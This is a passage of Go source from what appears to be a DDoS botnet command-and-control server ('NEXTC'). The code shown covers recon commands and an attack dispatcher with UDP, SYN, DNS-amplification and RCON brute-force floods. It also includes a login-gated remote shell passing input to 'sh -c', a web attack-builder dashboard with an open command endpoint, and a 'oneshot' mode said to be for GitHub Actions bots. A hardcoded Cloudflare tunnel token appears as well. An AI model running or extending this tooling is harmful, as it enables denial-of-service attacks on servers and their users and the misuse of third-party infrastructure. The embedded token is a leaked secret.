				infoStr := strings.ReplaceAll(string(buf[5:n]), "\n", " ")
				results = append(results, fmt.Sprintf("[+] getinfo: %s", infoStr))
			}

			conn.Write([]byte{0xFF, 0xFF, 0xFF, 0xFF, 0x67, 0x65, 0x74, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73})
			buf2 := make([]byte, 4096)
			n2, err := conn.Read(buf2)
			if err != nil {
				results = append(results, fmt.Sprintf("[-] getstatus: %v", err))
			} else if n2 > 5 {
				results = append(results, fmt.Sprintf("[+] getstatus raw: %d bytes", n2))
				parts2 := strings.SplitN(string(buf2[5:n2]), "\n", 5)
				for i, p := range parts2 {
					p = strings.TrimSpace(p)
					if len(p) < 200 {
						results = append(results, fmt.Sprintf("  [%d] %s", i, p))
					} else {
						results = append(results, fmt.Sprintf("  [%d] %s...(%d chars)", i, p[:min(150, len(p))], len(p)))
					}
				}
			}
		}

		txResp, _ := httpGet(fmt.Sprintf("https://servers-frontend.fivem.net/api/servers/single/%s", target))
		if txResp != "" && len(txResp) > 50 {
			if len(txResp) > 800 {
				txResp = txResp[:800]
			}
			results = append(results, fmt.Sprintf("[+] cfx.re: %s", txResp))
		}

		return fmt.Sprintf("[+] FiveM Info %s:\r\n%s", target, strings.Join(results, "\r\n"))
	}

	if strings.HasPrefix(lower, "wingprobe ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: wingprobe <IP> [puerto]"
		}
		ip := parts[1]
		ports := []string{"8080", "8443", "2022", "443", "80"}
		var results []string
		results = append(results, "[*] Probing Pterodactyl Wings daemon...")

		for _, p := range ports {
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", ip, p), 3*time.Second)
			if err == nil {
				conn.Close()
				resp, _ := httpGet(fmt.Sprintf("https://%s:%s/api", ip, p))
				resp2, _ := httpGet(fmt.Sprintf("http://%s:%s/api", ip, p))
				if strings.Contains(resp, "Wings") || strings.Contains(resp2, "Wings") || strings.Contains(resp, "wings") || strings.Contains(resp2, "wings") {
					results = append(results, fmt.Sprintf("[+] Wings daemon on port %s!", p))
				} else if strings.Contains(resp, "nginx") || strings.Contains(resp2, "nginx") {
					results = append(results, fmt.Sprintf("[?] Port %s open (nginx)", p))
				} else {
					results = append(results, fmt.Sprintf("[?] Port %s open (unknown service)", p))
				}
			}
		}
		if len(results) <= 1 {
			results = append(results, "[-] No Wings daemon ports found")
		}
		return fmt.Sprintf("[+] Wings Probe %s:\r\n%s", ip, strings.Join(results, "\r\n"))
	}

	if strings.HasPrefix(lower, "cfxsearch ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: cfxsearch <termino>"
		}
		query := strings.Join(parts[1:], " ")
		resp, err := httpGet(fmt.Sprintf("https://servers-frontend.fivem.net/api/servers/search?q=%s&limit=10", query))
		if err != nil {
			return fmt.Sprintf("[!] Error: %v", err)
		}
		if len(resp) > 2000 {
			resp = resp[:2000]
		}
		return fmt.Sprintf("[+] CFX Search '%s':\r\n%s", query, resp)
	}

	if strings.HasPrefix(lower, "subscan ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: subscan <dominio>"
		}
		domain := parts[1]
		var results []string

		subs := []string{
			"panel", "game", "cp", "pterodactyl", "wings", "daemon",
			"node", "node1", "node2", "srv", "server", "s1", "s2",
			"vps", "host", "admin", "dashboard", "manage", "api",
			"cdn", "files", "status", "dev", "staging", "test",
			"mail", "webmail", "ftp", "ssh", "db", "mysql",
		}
		var wg sync.WaitGroup
		var mu sync.Mutex
		sem := make(chan struct{}, 20)
		for _, sub := range subs {
			wg.Add(1)
			go func(s string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()
				target := fmt.Sprintf("%s.%s", s, domain)
				_, err := net.LookupHost(target)
				if err == nil {
					mu.Lock()
					results = append(results, fmt.Sprintf("[FOUND] %s", target))
					mu.Unlock()
				}
			}(sub)
		}
		wg.Wait()
		if len(results) == 0 {
			return fmt.Sprintf("[-] No subdomains found for %s", domain)
		}
		return fmt.Sprintf("[+] Subdomain scan %s:\r\n%s", domain, strings.Join(results, "\r\n"))
	}

	if strings.HasPrefix(lower, "techdetect ") {
		parts := strings.Fields(cmd)
		if len(parts) < 2 {
			return "[!] Uso: techdetect <URL>"
		}
		url := parts[1]
		if !strings.HasPrefix(url, "http") {
			url = "https://" + url
		}
		var detections []string

		resp, err := httpGet(url)
		if err != nil {
			return fmt.Sprintf("[!] Error: %v", err)
		}
		respLower := strings.ToLower(resp)

		detections = append(detections, fmt.Sprintf("URL: %s", url))
		detections = append(detections, fmt.Sprintf("Size: %d bytes", len(resp)))

		checks := map[string]string{
			"Pterodactyl":   "pterodactyl",
			"Laravel":       "laravel",
			"PHP":           "php",
			"Cloudflare":    "cloudflare",
			"nginx":         "nginx",
			"Apache":        "apache",
			"React":         "react",
			"Next.js":       "next",
			"Vue.js":        "vue",
			"jQuery":        "jquery",
			"Bootstrap":     "bootstrap",
			"Tailwind":      "tailwind",
			"WordPress":     "wordpress",
			"Node.js":       "node.js",
			"Django":        "django",
			"Flask":         "flask",
			"Ruby on Rails": "rails",
			"ASP.NET":       "asp.net",
			"VibeGAMES":     "vibegames",
			"Wings":         "wings",
			"Docker":        "docker",
		}
		for name, sig := range checks {
			if strings.Contains(respLower, sig) {
				detections = append(detections, fmt.Sprintf("[TECH] %s", name))
			}
		}

		hresp, _ := httpGetHeaders(url)
		if hresp != "" {
			detections = append(detections, fmt.Sprintf("[HEADERS] %s", hresp))
		}

		return fmt.Sprintf("[+] Tech Detect %s:\r\n%s", url, strings.Join(detections, "\r\n"))
	}

	if strings.HasPrefix(lower, "stop ") {
		parts := strings.Split(lower, " ")
		if len(parts) >= 2 {
			id, err := strconv.Atoi(parts[1])
			if err != nil {
				return "[!] ID invalido"
			}
			return stopAttack(id)
		}
		return "[!] Uso: stop <id>"
	}

	if strings.HasPrefix(lower, "attack ") {
		parts := strings.Split(lower, " ")
		if len(parts) >= 6 {
			target := parts[1]
			port, err1 := strconv.Atoi(parts[2])
			method := parts[3]
			threads, err2 := strconv.Atoi(parts[4])
			duration, err3 := strconv.Atoi(parts[5])

			if err1 != nil || err2 != nil || err3 != nil {
				return "[!] Error: puerto, hilos y duracion deben ser numeros"
			}

            validMethods := map[string]bool{"udp": true, "tcp": true, "query": true, "info": true, "rcon": true, "http": true, "connect": true, "getstatus": true, "timeout": true, "bypass": true, "tcpflood": true, "synflood": true, "dnsamp": true, "nginx": true, "all": true}
			if !validMethods[method] {
				return "[!] Metodo invalido. Usa: udp, tcp, query, info, rcon, all"
			}

			return startAttack(target, port, method, threads, duration)
		}
		return "[!] Uso: attack <IP> <puerto> <metodo> <hilos> <duracion>"
	}

	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		return string(out) + "\n"
	}
	if len(out) == 0 {
		return "OK\n"
	}
	return string(out)
}

func handleRawClient(conn net.Conn) {
	defer conn.Close()
	addr := conn.RemoteAddr().String()
	logMsg(fmt.Sprintf("[RAW] Conexion desde %s", addr))

	conn.SetDeadline(time.Now().Add(TIMEOUT * time.Second))
	reader := bufio.NewReader(conn)

	writeRaw(conn, banner())
	conn.Write([]byte(stealthBanner()))
	conn.Write([]byte("login: "))

	for attempt := 0; attempt < 3; attempt++ {
		loginLine, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		loginLine = strings.TrimSpace(loginLine)

		var username, password string
		if strings.Contains(loginLine, ":") {
			parts := strings.SplitN(loginLine, ":", 2)
			username = parts[0]
			password = parts[1]
		} else {
			parts := strings.Fields(loginLine)
			if len(parts) >= 2 {
				username = parts[0]
				password = parts[1]
			} else {
				username = loginLine
				conn.Write([]byte("Password: "))
				pwLine, err := reader.ReadString('\n')
				if err != nil {
					return
				}
				password = strings.TrimSpace(pwLine)
			}
		}

		if username == "" || password == "" {
			writeRaw(conn, "Login incorrect")
			continue
		}

		logMsg(fmt.Sprintf("[RAW] User: '%s'", username))

		if checkCredentials(username, password) {
			writeRaw(conn, "$ ")
			cmdLoop(conn, reader, addr)
			return
		}
		writeRaw(conn, "Login incorrect")
		if attempt < 2 {
			conn.Write([]byte("login: "))
		}
	}
	writeRaw(conn, "Connection closed.")
}

func cmdLoop(conn net.Conn, reader *bufio.Reader, addr string) {
	for {
		conn.SetDeadline(time.Now().Add(TIMEOUT * time.Second))
		conn.Write([]byte("$ "))

		cmd, err := reader.ReadString('\n')
		if err != nil {
			logMsg(fmt.Sprintf("[RAW] Error leyendo de %s: %v", addr, err))
			return
		}

		cmd = strings.TrimSpace(cmd)
		if cmd == "" {
			continue
		}

		if strings.ToLower(cmd) == "exit" || strings.ToLower(cmd) == "quit" {
			writeRaw(conn, "logout")
			return
		}

		// If user launches an attack, auto-enter live monitor
		if strings.HasPrefix(strings.ToLower(cmd), "attack ") {
			parts := strings.Fields(cmd)
			if len(parts) >= 6 {
				port, _ := strconv.Atoi(parts[2])
				dur, _ := strconv.Atoi(parts[5])
				target := parts[1]
				conn.Write([]byte("\r\n[*] Monitor en vivo iniciado. Ctrl+C para salir.\r\n"))
				liveMonitor(conn, target, port, dur)
				continue
			}
		}

		if strings.ToLower(cmd) == "proxyload" {
			go fetchProxies()
			conn.Write([]byte("\r\n[*] Cargando proxies... (live)\r\n"))
			proxyWatch(conn)
			continue
		}

		resultado := ejecutarSistema(cmd)
		resultado = strings.ReplaceAll(resultado, "\r\n", "\n")
		resultado = strings.ReplaceAll(resultado, "\n", "\r\n")
		if !strings.HasSuffix(resultado, "\r\n") {
			resultado += "\r\n"
		}
		conn.Write([]byte(resultado))
	}
}

func liveMonitor(conn net.Conn, target string, port int, duration int) {
	end := time.Now().Add(time.Duration(duration) * time.Second)
	lastSent := int64(0)
	lastCheck := time.Now()

	for time.Now().Before(end) {
		// Find attack stats (latest matching target/port)
		attackMu.Lock()
		var att *Attack
		for _, a := range attackList {
			if a.Target == target && a.Port == port && a.Running {
				att = a
			}
		}
		attackMu.Unlock()

		sent := int64(0)
		errors := int64(0)
		if att != nil {
			sent = att.Stats.Sent
			errors = att.Stats.Errors
		}

		// Calculate live PPS
		now := time.Now()
		dt := now.Sub(lastCheck).Seconds()
		var pps int64
		if dt > 0 {
			pps = int64(float64(sent-lastSent) / dt)
		}
		lastSent = sent
		lastCheck = now

		// paping check - does server respond?
		status := "UP"
		pconn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 1*time.Second)
		if err != nil {
			status = "DOWN/FILTERED"
		} else {
			pconn.Close()
		}

		remaining := int(end.Sub(time.Now()).Seconds())
		line := fmt.Sprintf("[%ds] sent=%d err=%d pps=%d | %s:%d %s\r\n",
			remaining, sent, errors, pps, target, port, status)
		conn.Write([]byte(line))

		time.Sleep(1 * time.Second)
	}

	attackMu.Lock()
	var att *Attack
	for _, a := range attackList {
		if a.Target == target && a.Port == port {
			att = a
		}
	}
	attackMu.Unlock()

	final := "[*] Timeout alcanzado.\r\n"
	if att != nil {
		final = fmt.Sprintf("[*] Ataque %d terminado. Total: %d paquetes, %d errores\r\n",
			att.ID, att.Stats.Sent, att.Stats.Errors)
	}
	conn.Write([]byte(final))
}

func proxyWatch(conn net.Conn) {
	for {
		proxyProgMu.Lock()
		done := proxyDone
		status := proxyStatus
		proxyProgMu.Unlock()

		conn.Write([]byte(status + "\r\n"))

		if done {
			return
		}
		time.Sleep(1 * time.Second)
	}
}

func writeRaw(w io.Writer, s string) {
	normalized := strings.ReplaceAll(s, "\r\n", "\n")
	normalized = strings.ReplaceAll(normalized, "\n", "\r\n")
	for strings.HasSuffix(normalized, "\r\n") {
		normalized = normalized[:len(normalized)-2]
	}
	w.Write([]byte(normalized + "\r\n"))
}

var wsUpgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

func handleDashboard(w http.ResponseWriter, r *http.Request) {
    defer func() {
        if r := recover(); r != nil {
            logMsg(fmt.Sprintf("[!] Dashboard panic: %v", r))
        }
    }()
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0")
    w.Header().Set("Pragma", "no-cache")
    w.Header().Set("Expires", "0")

	attackMu.Lock()
	active := 0
	var attackJSON string
	now := time.Now()
	for id, att := range attackList {
		elapsed := now.Sub(att.Start).Seconds()
		pps := int64(0)
		if elapsed > 0 {
			pps = int64(float64(att.Stats.Sent) / elapsed)
		}
		running := "false"
		if att.Running {
			running = "true"
			active++
		}
		attackJSON += fmt.Sprintf(`{"id":%d,"target":"%s","port":%d,"method":"%s","threads":%d,"duration":%d,"sent":%d,"errors":%d,"pps":%d,"running":%s},`,
			id, att.Target, att.Port, att.Method, att.Threads, att.Duration, att.Stats.Sent, att.Stats.Errors, pps, running)
	}
	attackJSON = strings.TrimRight(attackJSON, ",")
	attackMu.Unlock()

	nodesMu.Lock()
	nodeCount := len(nodes) + 1
	nodesMu.Unlock()

	html := fmt.Sprintf(`<!DOCTYPE html><html><head><title>NEXTC</title><meta charset="utf-8">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#888;font-family:monospace;display:flex;height:100vh}
#sidebar{width:180px;background:#0d0d0d;border-right:1px solid #1a1a1a;padding:15px 0;display:flex;flex-direction:column}
#sidebar .logo{color:#f0b000;font-size:16px;font-weight:bold;padding:0 15px 20px;border-bottom:1px solid #1a1a1a;margin-bottom:10px}
#sidebar a{color:#666;text-decoration:none;padding:8px 15px;font-size:13px;display:block;border-left:2px solid transparent}
#sidebar a:hover,#sidebar a.active{color:#f0b000;background:#111;border-left:2px solid #f0b000}
#main{flex:1;overflow-y:auto;padding:25px}
h1{color:#f0b000;font-size:18px;margin-bottom:15px}
.stats{display:flex;gap:15px;margin-bottom:20px;flex-wrap:wrap}
.stat{background:#111;border:1px solid #222;border-radius:8px;padding:16px 20px;min-width:130px}
.stat .val{font-size:26px;font-weight:bold}.stat .lbl{font-size:11px;color:#555;margin-top:4px}
.green{color:#0f0}.red{color:#e55}.gold{color:#f0b000}
table{width:100%%;border-collapse:collapse;font-size:12px;margin-top:10px}
th{text-align:left;color:#555;padding:6px 10px;border-bottom:2px solid #1a1a1a}
td{padding:6px 10px;border-bottom:1px solid #111}
tr:hover td{background:#111}
input,select,button{background:#111;border:1px solid #222;color:#0f0;padding:6px 10px;font-family:monospace;font-size:12px;border-radius:4px;margin:2px}
button{cursor:pointer;background:#1a3a1a;border-color:#2a5a2a}
button:hover{background:#2a5a2a}
button.red{background:#3a1a1a;border-color:#5a2a2a}
.tab-content{display:none}.tab-content.active{display:block}
#output{background:#0d0d0d;border:1px solid #1a1a1a;border-radius:6px;padding:12px;min-height:150px;max-height:400px;overflow-y:auto;white-space:pre-wrap;font-size:12px;color:#0f0;margin-top:10px}
.badge{display:inline-block;padding:2px 6px;border-radius:3px;font-size:10px;font-weight:bold}
.badge-running{background:#3a1a1a;color:#e55}.badge-stopped{background:#1a1a1a;color:#555}
</style></head><body>
<div id="sidebar">
<div class="logo">NEXTC</div>
<a href="#" class="active" onclick="showTab(event,'overview')">OVERVIEW</a>
<a href="#" onclick="showTab(event,'attacks')">ATTACKS</a>
<a href="#" onclick="showTab(event,'builder')">BUILDER</a>
<a href="#" onclick="showTab(event,'nodes')">NODES</a>
<a href="#" onclick="showTab(event,'users')">USERS</a>
<a href="#" onclick="showTab(event,'recon')">RECON</a>
</div>
<div id="main">
<div id="tab-overview" class="tab-content active">
<h1>OVERVIEW</h1>
<div class="stats">
<div class="stat"><div class="val red" id="active-count">%d</div><div class="lbl">ACTIVE ATTACKS</div></div>
<div class="stat"><div class="val gold" id="node-count">%d</div><div class="lbl">NODES</div></div>
<div class="stat"><div class="val green">13</div><div class="lbl">METHODS</div></div>
<div class="stat"><div class="val" style="color:#888" id="total-sent">0</div><div class="lbl">TOTAL SENT</div></div>
</div>
<h2 style="color:#555;font-size:13px;margin-top:20px">RECENT ATTACKS</h2>
<table><thead><tr><th>ID</th><th>TARGET</th><th>METHOD</th><th>THR</th><th>SENT</th><th>PPS</th><th>STATUS</th></tr></thead>
<tbody id="attack-table"></tbody></table>
</div>
<div id="tab-attacks" class="tab-content"><h1>ALL ATTACKS</h1><table><thead><tr><th>ID</th><th>TARGET</th><th>PORT</th><th>METHOD</th><th>THR</th><th>DUR</th><th>SENT</th><th>ERR</th><th>PPS</th><th>ACTION</th></tr></thead><tbody id="attack-all-table"></tbody></table></div>
<div id="tab-builder" class="tab-content">
<h1>ATTACK BUILDER</h1>
<div style="display:flex;gap:8px;flex-wrap:wrap;align-items:end;margin-bottom:15px">
<div><label style="font-size:11px;color:#555">TARGET IP</label><br><input id="b-target" placeholder="1.2.3.4" style="width:140px"></div>
<div><label style="font-size:11px;color:#555">PORT</label><br><input id="b-port" value="30120" style="width:70px"></div>
<div><label style="font-size:11px;color:#555">METHOD</label><br><select id="b-method"><option>timeout</option><option>udp</option><option>tcp</option><option>tcpflood</option><option>synflood</option><option>dnsamp</option><option>http</option><option>connect</option><option>getstatus</option><option>query</option><option>info</option><option>rcon</option><option>bypass</option><option>all</option></select></div>
<div><label style="font-size:11px;color:#555">THREADS</label><br><input id="b-threads" value="500" style="width:70px"></div>
<div><label style="font-size:11px;color:#555">DURATION (s)</label><br><input id="b-duration" value="60" style="width:70px"></div>
<div><br><button onclick="launchAttack()">LAUNCH</button></div>
</div>
<div id="builder-output"></div>
</div>
<div id="tab-nodes" class="tab-content"><h1>NODES</h1><div id="nodes-content">Loading...</div></div>
<div id="tab-users" class="tab-content">
<h1>USERS</h1>
<div style="display:flex;gap:8px;margin-bottom:15px">
<input id="u-user" placeholder="username" style="width:140px">
<input id="u-pass" placeholder="password" style="width:140px">
<button onclick="addUser()">ADD</button>
<button class="red" onclick="delUser()">DEL</button>
</div>
<div id="users-content">Loading...</div>
</div>
<div id="tab-recon" class="tab-content">
<h1>RECON</h1>
<div style="display:flex;gap:8px;margin-bottom:10px">
<select id="r-cmd"><option>portscan</option><option>geoip</option><option>dns</option><option>shodan</option><option>whois</option><option>wafdetect</option><option>techdetect</option><option>subscan</option><option>ptprobe</option><option>fiveminfo</option></select>
<input id="r-target" placeholder="target" style="width:200px">
<button onclick="runRecon()">RUN</button>
</div>
<div id="recon-output"></div>
</div>
</div>
<script>
function showTab(e,t){e.preventDefault();document.querySelectorAll('.tab-content').forEach(el=>el.classList.remove('active'));document.getElementById('tab-'+t).classList.add('active');document.querySelectorAll('#sidebar a').forEach(el=>el.classList.remove('active'));e.target.classList.add('active')}
function launchAttack(){
 var t=document.getElementById('b-target').value;
 var p=document.getElementById('b-port').value;
 var m=document.getElementById('b-method').value;
 var h=document.getElementById('b-threads').value;
 var d=document.getElementById('b-duration').value;
 if(!t){alert('Target required');return}
 fetch('/api/exec?cmd='+encodeURIComponent('attack '+t+' '+p+' '+m+' '+h+' '+d))
 .then(r=>r.text()).then(txt=>{document.getElementById('builder-output').innerHTML='<div id="output">'+txt+'</div>'})
}
function addUser(){var u=document.getElementById('u-user').value;var p=document.getElementById('u-pass').value;if(!u||!p)return;fetch('/api/exec?cmd='+encodeURIComponent('adduser '+u+' '+p)).then(r=>r.text()).then(loadUsers)}
function delUser(){var u=document.getElementById('u-user').value;if(!u)return;fetch('/api/exec?cmd='+encodeURIComponent('deluser '+u)).then(r=>r.text()).then(loadUsers)}
function loadUsers(){fetch('/api/exec?cmd=reloadusers').then(r=>r.text()).then(t=>{document.getElementById('users-content').innerText=t})}
function runRecon(){var c=document.getElementById('r-cmd').value;var t=document.getElementById('r-target').value;if(!t)return;fetch('/api/exec?cmd='+encodeURIComponent(c+' '+t)).then(r=>r.text()).then(txt=>{document.getElementById('recon-output').innerHTML='<div id="output">'+txt+'</div>'})}
function stopAttack(id){fetch('/api/exec?cmd=stop '+id)}
var attacks=[%s];
function updateUI(){
 fetch('/api/stats').then(r=>r.json()).then(d=>{
  document.getElementById('active-count').textContent=d.active||0;
  document.getElementById('node-count').textContent=d.nodes||1;
  document.getElementById('total-sent').textContent=((d.totalSent||0)/1000000).toFixed(1)+'M';
  var tbody=document.getElementById('attack-table');
  var tbody2=document.getElementById('attack-all-table');
  tbody.innerHTML='';tbody2.innerHTML='';
  (d.attacks||[]).forEach(a=>{
   var s=a.running?'<span class="badge badge-running">ACTIVE</span>':'<span class="badge badge-stopped">DONE</span>';
   var r='<tr><td>'+a.id+'</td><td>'+a.target+':'+a.port+'</td><td>'+a.method+'</td><td>'+a.threads+'</td><td>'+(a.sent/1000).toFixed(1)+'K</td><td>'+(a.pps/1000).toFixed(1)+'K/s</td><td>'+s+'</td></tr>';
   tbody.innerHTML+=r;
   tbody2.innerHTML+=r+'<td>'+(a.running?'<button class="red" onclick="stopAttack('+a.id+')">STOP</button>':'')+'</td>';
  });
  if(!d.attacks||d.attacks.length==0){tbody.innerHTML='<tr><td colspan="7" style="color:#555">No attacks</td></tr>';tbody2.innerHTML='<tr><td colspan="10" style="color:#555">No attacks</td></tr>'}
  document.getElementById('nodes-content').innerText='Master + '+(d.nodes-1)+' workers';
 });
 fetch('/api/exec?cmd=reloadusers').then(r=>r.text()).then(t=>{document.getElementById('users-content').innerText=t})
}
setInterval(updateUI,2000);
updateUI();
loadUsers();
</script></body></html>`, active, nodeCount, attackJSON)
    w.Write([]byte(html))
}

func handleAPIExec(w http.ResponseWriter, r *http.Request) {
    defer func() {
        if r := recover(); r != nil {
            logMsg(fmt.Sprintf("[!] API panic: %v", r))
            w.Write([]byte("ERROR: internal panic"))
        }
    }()
    w.Header().Set("Content-Type", "text/plain; charset=utf-8")
    cmd := r.URL.Query().Get("cmd")
    if cmd == "" {
        w.Write([]byte("ERROR"))
        return
    }
    if strings.HasPrefix(cmd, "attack ") {
        go ejecutarSistema(cmd)
        w.Write([]byte("[+] Attack queued"))
        return
    }
    result := ejecutarSistema(cmd)
    w.Write([]byte(result))
}

func handleAPIStats(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	attackMu.Lock()
	var attacks []map[string]interface{}
	active := 0
	var totalSent int64
	now := time.Now()
	for _, att := range attackList {
		elapsed := now.Sub(att.Start).Seconds()
		pps := int64(0)
		if elapsed > 0 {
			pps = int64(float64(att.Stats.Sent) / elapsed)
		}
		if att.Running {
			active++
		}
		totalSent += att.Stats.Sent
		attacks = append(attacks, map[string]interface{}{
			"id": att.ID, "target": att.Target, "port": att.Port, "method": att.Method,
			"threads": att.Threads, "duration": att.Duration, "sent": att.Stats.Sent,
			"errors": att.Stats.Errors, "pps": pps, "running": att.Running,
		})
	}
	attackMu.Unlock()
	nodesMu.Lock()
	nodeCount := len(nodes) + 1
	nodesMu.Unlock()
	fmt.Fprintf(w, `{"active":%d,"nodes":%d,"totalSent":%d,"attacks":`, active, nodeCount, totalSent)
	json, _ := json.Marshal(attacks)
	w.Write(json)
	w.Write([]byte("}"))
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()
	var wsMu sync.Mutex
	defer func() {
		wsClientsMu.Lock()
		delete(wsClients, conn)
		wsClientsMu.Unlock()
	}()
	wsClientsMu.Lock()
	wsClients[conn] = &wsMu
	wsClientsMu.Unlock()

	addr := r.RemoteAddr
	logMsg(fmt.Sprintf("[WS] Conexion desde %s", addr))

	conn.SetReadDeadline(time.Now().Add(TIMEOUT * time.Second))

	writeWS(conn, &wsMu, banner())
	writeWS(conn, &wsMu, "")
	writeWS(conn, &wsMu, "AUTENTICACION REQUERIDA")
	writeWS(conn, &wsMu, "")

	writeWS(conn, &wsMu, "Usuario: ")
	_, msg, err := conn.ReadMessage()
	if err != nil {
		return
	}
	username := strings.TrimSpace(string(msg))
	if username == "" {
		return
	}

	writeWS(conn, &wsMu, "Contrasena: ")
	_, msg, err = conn.ReadMessage()
	if err != nil {
		return
	}
	password := strings.TrimSpace(string(msg))

	logMsg(fmt.Sprintf("[WS] User: '%s'", username))

	if !checkCredentials(username, password) {
		writeWS(conn, &wsMu, "")
		writeWS(conn, &wsMu, "Credenciales incorrectas")
		time.Sleep(1 * time.Second)
		return
	}

	writeWS(conn, &wsMu, "")
	writeWS(conn, &wsMu, "Autenticacion exitosa!")
	writeWS(conn, &wsMu, "Escribe 'help' para comandos")
	writeWS(conn, &wsMu, "")

	loopWS(conn, &wsMu, addr)
}

func loopWS(conn *websocket.Conn, mu *sync.Mutex, addr string) {
	for {
		conn.SetReadDeadline(time.Now().Add(TIMEOUT * time.Second))
		writeWS(conn, mu, "MFC> ")

		_, msg, err := conn.ReadMessage()
		if err != nil {
			logMsg(fmt.Sprintf("[WS] Error leyendo de %s: %v", addr, err))
			return
		}

		cmd := strings.TrimSpace(string(msg))
		if cmd == "" {
			continue
		}

		if strings.ToLower(cmd) == "exit" || strings.ToLower(cmd) == "quit" {
			writeWS(conn, mu, "")
			writeWS(conn, mu, "Adios.")
			return
		}

		resultado := ejecutarSistema(cmd)
		resultado = strings.ReplaceAll(resultado, "\r\n", "\n")
		resultado = strings.ReplaceAll(resultado, "\n", "\r\n")
		if !strings.HasSuffix(resultado, "\r\n") {
			resultado += "\r\n"
		}
		writeWS(conn, mu, resultado)
	}
}

func writeWS(conn *websocket.Conn, mu *sync.Mutex, s string) {
	mu.Lock()
	defer mu.Unlock()
	conn.WriteMessage(websocket.TextMessage, []byte(s))
}

func main() {
	tuiMode := flag.Bool("tui", false, "Launch TUI dashboard")
	flag.Parse()

	// One-shot mode for GitHub Actions bots: ./c2 oneshot <IP> <port> <method> <threads> <duration>
	if len(os.Args) >= 2 && os.Args[1] == "oneshot" {
		runtime.GOMAXPROCS(2)
		if len(os.Args) < 7 {
			fmt.Println("[!] Uso: ./c2 oneshot <IP> <puerto> <metodo> <hilos> <duracion>")
			os.Exit(1)
		}
		target := os.Args[2]
		port, _ := strconv.Atoi(os.Args[3])
		method := os.Args[4]
		threads, _ := strconv.Atoi(os.Args[5])
		duration, _ := strconv.Atoi(os.Args[6])

		stats := &AttackStats{Sent: 0, Errors: 0}
		stopChan := make(chan bool)
		isWorkerCommand = true // no distribute

		fmt.Printf("[+] BOT: atacando %s:%d | %s | %d hilos | %ds\n", target, port, method, threads, duration)

		var wg sync.WaitGroup
		for i := 0; i < threads; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				switch method {
				case "udp":
					udpFlood(target, port, duration, stats, stopChan)
				case "tcp":
					tcpFlood(target, port, duration, stats, stopChan)
				case "query":
					queryFlood(target, port, duration, stats, stopChan)
				case "info":
					infoFlood(target, port, duration, stats, stopChan)
				case "rcon":
					rconBruteforce(target, port, duration, stats, stopChan)
				case "http":
					httpFlood(target, port, duration, stats, stopChan)
				case "connect":
					connectFlood(target, port, duration, stats, stopChan)
				case "getstatus":
					getStatusFlood(target, port, duration, stats, stopChan)
				case "timeout":
					timeoutFlood(target, port, duration, stats, stopChan)
				case "bypass":
					bypassFlood(target, port, duration, stats, stopChan)
				case "tcpflood":
					tcpfloodFlood(target, port, duration, stats, stopChan)
				case "synflood":
					synFlood(target, port, duration, stats, stopChan)
				case "dnsamp":
					dnsAmpFlood(target, port, duration, stats, stopChan)
				case "nginx":
					nginxFlood(target, port, duration, stats, stopChan)
				default:
					timeoutFlood(target, port, duration, stats, stopChan)
				}
			}()
		}
		wg.Wait()
		fmt.Printf("[+] BOT FINALIZADO: %d paquetes, %d errores\n", stats.Sent, stats.Errors)
		return
	}

	if *tuiMode {
		runtime.GOMAXPROCS(1)
		initLog()
		initDB()
		loadUsers()
		go func() {
			cfToken := "eyJhIjoiMGUyYzZlNTgxYTA0ODFmZWNmMTMxZDY4NGYzYjM1YTciLCJ0IjoiZGJkM2ZhNWUtZDYwZC00MTFhLWE4NmUtMWRlOGRjNTk3ZWZlIiwicyI6Ik9HUmlNVEUwTXpNdFkyTTFaaTAwTnpWbExXRTJOekF0WlRVeE16Y3lNekpoWXpaaSJ9"
			cmd := exec.Command("cloudflared", "tunnel", "--no-autoupdate", "run", "--token", cfToken)
			cmd.Stdout = nil
			cmd.Stderr = nil
			if err := cmd.Start(); err != nil {
				logMsg("[!] Cloudflared no disponible - túnel WS no activo")
				return
			}
			logMsg("[+] Cloudflared tunnel iniciado")
			cmd.Wait()
		}()
		go func() {
			http.HandleFunc("/ws", handleWebSocket)
			http.HandleFunc("/api/exec", handleAPIExec)
			http.HandleFunc("/api/stats", handleAPIStats)
			http.HandleFunc("/", handleDashboard)
			http.ListenAndServe("0.0.0.0:8080", nil)
		}()
		go func() {
			listener, err := net.Listen("tcp", "0.0.0.0:3333")
			if err != nil {
				return
			}
			defer listener.Close()
			nodeL, err := net.Listen("tcp", "0.0.0.0:3334")
			if nodeL != nil {
				go func() {
					defer nodeL.Close()
					for {
						conn, err := nodeL.Accept()
						if err != nil {
							return
						}
						go handleNode(conn, conn.RemoteAddr().String())
					}
				}()
			}
			for {
				conn, err := listener.Accept()
				if err != nil {
					return
				}
				go handleRawClient(conn)
			}
		}()
		time.Sleep(500 * time.Millisecond)
		p := tea.NewProgram(tuiModel{})
		if _, err := p.Run(); err != nil {
			fmt.Println("Error:", err)
		}
		return
	}

	runtime.GOMAXPROCS(1)
	var rlim syscall.Rlimit
	syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rlim)
	rlim.Cur = 200000
	syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rlim)

	initLog()
	defer logFile.Close()

	if err := initDB(); err != nil {
		logMsg(fmt.Sprintf("[!] Error DB: %v", err))
		os.Exit(1)
	}
	defer db.Close()

	if err := loadUsers(); err != nil {
		logMsg(fmt.Sprintf("[!] Error cargando usuarios: %v", err))
		os.Exit(1)
	}

	userList, _ := listUsers()
